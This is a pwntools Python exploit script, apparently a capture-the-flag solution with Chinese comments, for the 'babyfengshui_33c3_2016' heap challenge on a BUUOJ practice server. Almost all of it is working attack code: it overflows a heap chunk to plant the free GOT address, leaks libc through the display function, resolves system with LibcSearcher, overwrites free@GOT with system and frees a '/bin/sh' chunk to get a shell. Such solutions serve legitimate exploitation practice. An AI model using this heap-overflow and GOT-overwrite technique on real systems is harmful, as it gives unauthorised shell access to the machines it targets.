from pwn import *
from LibcSearcher import LibcSearcher
import sys

io = -1
############################
#********修改文件名**********
############################
file_name = 'babyfengshui_33c3_2016'
port = 29860

###########修改宏###########
DEBUG = 1
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    stop_count = -1
    def STOP(idx=0):
        global stop_count
        stop_count += 1
        input('stop{}...... ===> {}'.format(stop_count, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)
    def STOP(idx=0):
        pass

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libs))
context.log_level = 'debug'

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
'''
堆溢出
'''

def add_user(size:int, text:bytes, name:bytes, ):
    global io
    io.sendlineafter("Action: ", b'0')
    io.sendlineafter("size of description: ", str(size).encode())
    io.sendlineafter("name: ", name)
    io.sendlineafter("text length: ",  str(len(text)).encode())
    io.sendlineafter("text: ", text)

def del_user(idx:int):
    global io
    io.sendlineafter("Action: ", b'1')
    io.sendlineafter("index: ", str(idx).encode())


def display_user(idx:int):
    global io
    io.sendlineafter("Action: ", b'2')
    io.sendlineafter("index: ", str(idx).encode())
    name = io.recvline()
    des = io.recvline()
    return name, des

def update_user(idx:int, text:bytes):
    global io
    io.sendlineafter("Action: ", b'3')
    io.sendlineafter("index: ", str(idx).encode())
    io.sendlineafter("text length: ",  str(len(text)).encode())
    io.sendlineafter("text: ", text)

    
'''
uaf 注意bins的范围
'''
# 申请4块内存
payload = 0xb * b'a'
add_user(size=0xc, text=payload, name=b'a')

payload = 0xb * b'b'
add_user(size=0xc, text=payload, name=b'b')

payload = 0xb * b'c'
add_user(size=0xc, text=payload, name=b'c')

payload = b'/bin/sh\x00' + 0x3 * b'd'
add_user(size=0xc, text=payload, name=b'd')


del_user(2)
del_user(0)

# 填充
target = io_elf.got['free']
payload = 0xc * b'f' + p32(0x89) + p32(0)*32 + p32(0x88) + p32(0x10) + b'/bin/sh\x00' + b'b'*0x4 + p32(0x89) + p32(target)
add_user(size=0xc, text=payload, name=b'f')

# 泄露地址
_, leak_addr = display_user(1)
leak_addr = u32(leak_addr[13:17])
LOG_ADDR_SUCCESS('leak_addr', leak_addr)
# 计算system的地址
libc = LibcSearcher('free', leak_addr)
libc_base = leak_addr - libc.dump('free')
system_addr = libc_base + libc.dump('system')
LOG_ADDR_SUCCESS('libc_base', libc_base)
LOG_ADDR_SUCCESS('system_addr', system_addr)

# 更新user4
update_user(1, p32(system_addr))

del_user(3)

io.interactive()
